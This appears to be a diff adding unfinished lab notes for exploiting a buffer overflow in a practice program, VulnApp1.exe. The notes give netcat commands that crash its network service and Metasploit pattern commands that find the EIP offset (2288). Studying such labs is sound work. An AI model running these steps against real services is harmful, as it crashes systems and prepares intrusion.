@@ -1,0 +1,21 @@
+
+Steps:
+    1. Identify buffer overlow opportunity
+        - Start VulnApp1.exe
+        - Start Immunity Debugger and attach to VulnApp1 process
+            Downloaded Immunity from here:
+                https://github.com/kbandla/ImmunityDebugger/releases/tag/1.85
+        - Run `python -c "print(\"A\" * 10000)" | nc 172.29.208.1 7001`
+        - Registers ECX, EDX, EBX, EBP, ESI, EDI, EIP are all overidden
+            by the buffer overflow.
+            And register ESP appears to point to somewhere in the
+            malicious buffer.
+    2. 
+
+
+Notes:
+    * Identified offset to override EIP
+        `msf-pattern_create -l 10000 | nc 172.29.208.1 7001`
+        `msf-pattern_offset -l 10000 -q 33794332`
+            => Exact match at offset 2288
+
